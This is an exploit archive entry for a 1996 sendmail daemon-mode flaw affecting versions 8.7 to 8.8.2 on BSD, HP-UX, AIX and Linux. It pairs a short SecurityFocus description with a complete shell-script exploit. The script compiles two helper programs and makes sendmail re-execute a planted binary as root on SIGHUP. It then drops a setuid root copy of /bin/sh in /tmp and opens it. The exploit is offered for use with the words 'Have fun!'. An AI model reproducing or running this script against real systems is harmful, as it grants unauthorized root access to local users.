BSD/OS 2.1,Caldera Network Desktop 1.0,Eric Allman Sendmail <= 8.8.2,FreeBSD 2.1.5/2.1.6,HP-UX <= 10.20,AIX 4.2,RedHat 4.0 Sendmail Daemon Mode Vulnerability

source: http://www.securityfocus.com/bid/716/info

Sendmail is often run in daemon mode so that it can "listen" for incoming mail connections on the standard SMTP networking port, usually port 25. The root user is the only user allowed to start sendmail this way, and sendmail contains code intended to enforce this restriction.

Unfortunately, due to a coding error, sendmail can be invoked in daemon mode in a way that bypasses the built-in check. When the check is bypassed, any local user is able to start sendmail in daemon mode. In addition, as of version 8.7, sendmail will restart itself when it receives a SIGHUP signal. It does this restarting operation by re-executing itself using the exec(2) system call. Re-executing is done as the root user. By manipulating the sendmail environment, the user can then have sendmail execute an arbitrary program with root privileges. 

#!/bin/sh
#
#
# Hi !
# This is exploit for sendmail smtpd bug
# (ver. 8.7-8.8.2 for FreeBSD, Linux and may be other platforms).
# This shell script does a root shell in /tmp directory.
# If you have any problems with it, drop me a letter.
# Have fun !
#
#
# ----------------------
# ---------------------------------------------
# ----------------- Dedicated to my beautiful lady ------------------
# ---------------------------------------------
# ----------------------
#
# Leshka Zakharoff, 1996. E-mail: leshka@leshka.chuvashia.su
#
#
#
echo 'main() '>>leshka.c
echo '{ '>>leshka.c
echo ' execl("/usr/sbin/sendmail","/tmp/smtpd",0); '>>leshka.c
echo '} '>>leshka.c
#
#
echo 'main() '>>smtpd.c
echo '{ '>>smtpd.c
echo ' setuid(0); setgid(0); '>>smtpd.c
echo ' system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh"); '>>smtpd.c
echo '} '>>smtpd.c
#
#
cc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c
./leshka
kill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs "[:digit:]" "\n"|head -n 1`
rm leshka.c leshka smtpd.c /tmp/smtpd
/tmp/sh